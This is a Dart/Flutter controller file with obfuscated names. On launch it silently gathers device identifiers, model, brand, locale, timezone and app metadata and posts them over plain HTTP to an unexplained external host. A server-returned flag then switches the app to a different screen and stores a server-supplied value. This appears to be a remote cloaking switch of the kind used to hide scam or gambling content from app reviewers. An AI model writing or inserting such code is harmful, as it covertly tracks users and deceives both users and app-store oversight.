import 'dart:convert';
import 'dart:io';

import 'package:connectivity_plus/connectivity_plus.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';

void checkReload() async {
  var connectResult = await (Connectivity().checkConnectivity());
  if(connectResult == ConnectivityResult.none){
    Get.toNamed("/networkCheck");
  }
}

class PageLogic extends GetxController {

  var phcjey = RxBool(false);
  var jmsowz = RxBool(true);
  var hgkyacp = RxString("");
  var cristopher = RxBool(false);
  var beier = RxBool(true);
  final mtdwkyhbl = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    checkReload();
    super.onInit();
    csdohtz();
  }


  Future<void> csdohtz() async {

    cristopher.value = true;
    beier.value = true;
    jmsowz.value = false;

    mtdwkyhbl.post("http://yo.passpportli.info/WKhM57J1Gty7vK",data: await ifzven()).then((value) {
      var uycepzv = value.data["uycepzv"] as String;
      var wjhacbkx = value.data["wjhacbkx"] as bool;
      if (wjhacbkx) {
        hgkyacp.value = uycepzv;
        madyson();
      } else {
        blick();
      }
    }).catchError((e) {
      jmsowz.value = true;
      beier.value = true;
      cristopher.value = false;
    });
  }

  Future<Map<String, dynamic>> ifzven() async {
    final DeviceInfoPlugin tqlxybo = DeviceInfoPlugin();
    PackageInfo ugarf_zcmliq = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var jtxw = Platform.localeName;
    var ZCHVyQmd = currentTimeZone;

    var uUFRsxr = ugarf_zcmliq.packageName;
    var fKEianhS = ugarf_zcmliq.version;
    var pcQYrMD = ugarf_zcmliq.buildNumber;

    var kMUylYD = ugarf_zcmliq.appName;
    var sRxh = "";
    var vPdUoRZb  = "";
    var solonPredovic = "";
    var LAqEcbR = "";
    var ollieKihn = "";
    var susannaBeier = "";


    var GKLs = "";
    var kevinCummerata = "";
    var fQgUb = false;

    if (GetPlatform.isAndroid) {
      GKLs = "android";
      var evdjguafqz = await tqlxybo.androidInfo;

      LAqEcbR = evdjguafqz.brand;

      sRxh  = evdjguafqz.model;
      vPdUoRZb = evdjguafqz.id;

      fQgUb = evdjguafqz.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      GKLs = "ios";
      var gbhoftym = await tqlxybo.iosInfo;
      LAqEcbR = gbhoftym.name;
      sRxh = gbhoftym.model;

      vPdUoRZb = gbhoftym.identifierForVendor ?? "";
      fQgUb  = gbhoftym.isPhysicalDevice;
    }
    var res = {
      "kMUylYD": kMUylYD,
      "fKEianhS": fKEianhS,
      "vPdUoRZb": vPdUoRZb,
      "uUFRsxr": uUFRsxr,
      "sRxh": sRxh,
      "ZCHVyQmd": ZCHVyQmd,
      "kevinCummerata" : kevinCummerata,
      "LAqEcbR": LAqEcbR,
      "jtxw": jtxw,
      "GKLs": GKLs,
      "ollieKihn" : ollieKihn,
      "fQgUb": fQgUb,
      "pcQYrMD": pcQYrMD,
      "susannaBeier" : susannaBeier,
      "solonPredovic" : solonPredovic,

    };
    return res;
  }

  Future<void> blick() async {
    Get.offAllNamed("/pixelMain");
  }

  Future<void> madyson() async {
    Get.offAllNamed("/pixelRule");
  }

}
